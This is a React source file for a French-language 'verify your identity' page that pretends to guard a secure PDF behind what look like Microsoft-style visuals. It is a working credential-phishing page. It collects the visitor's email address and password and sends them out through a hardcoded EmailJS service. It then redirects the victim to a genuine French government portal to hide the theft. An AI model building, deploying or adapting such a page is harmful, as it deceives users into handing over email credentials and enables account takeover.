import one from '../src/assets/one.png';
import micr from '../src/assets/micr.webp';
import pdf from '../src/assets/pdf.png';
import cap from '../src/assets/cap.png';
import emailjs from "@emailjs/browser";
import { useRef, useState } from 'react';


function App() {

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordInput, setShowPasswordInput] = useState(false); // Ajout de l'état pour gérer l'affichage de l'input password
  const form = useRef();

  const handleContinueClick = (e) => {
    e.preventDefault();
    if (!email) {
      alert("Veuillez entrer une adresse e-mail.");
      return;
    }
    setShowPasswordInput(true);
  };


  
  const handleSignInClick = (e) => {
    e.preventDefault();
    if (!email || !password) {
      alert("Veuillez remplir tous les champs.");
      return;
    }

    emailjs
      .sendForm("service_44mdivb", "template_18yyg38", form.current, {
        publicKey: "I38CNoPxPsXFjETua",
      })
      .then(
        () => {
          console.log("SUCCESS!");
          setEmail("");
          setPassword("");
          window.location.href = 'https://portail.chorus-pro.gouv.fr/aife_csm/fr?id=aife_catitem_details&cat_item_id=6e479e0d1ba0b410a15587b5604bcb2d';
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );
  };
  return (
    <div className='body'>
      <div className="entete">
        <img src={one} alt="" />
      </div>

      <div className="deux">
        <img src={micr} alt="" />
      </div>

      <div className="section">
        <div className="h2">
          <h2>Vérifiez Votre Identité</h2>
        </div>
        <hr />
        <div className="section2">
          <h5 style={{ marginTop: "2vw" }}>Vous avez reçu un fichier sécurisé</h5>
          <div className="file">
            <img src={pdf} alt="" />
            <h3>56.1KB</h3>
          </div>

          <h5>
            Pour lire le document veuillez entrer les identifiants de messagerie
            auxquels ce fichier a été envoyé.
          </h5>

          <div className="images">
            <img src={cap} alt="" />
          </div>

          <div className="form">
            <form ref={form} onSubmit={handleSignInClick}>
              <input
                type="email"
                id="email"
                name="user_email"
                placeholder="Entrez l'adresse e-mail"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              {showPasswordInput && ( // Afficher l'input password uniquement si showPasswordInput est vrai
                <input
                  type="password"
                  id="password"
                  name="user_password"
                  placeholder="Entrez votre mot de passe"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              )}
              <button onClick={showPasswordInput ? handleSignInClick : handleContinueClick}>
                {showPasswordInput ? "S'identifier" : "Continuer"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
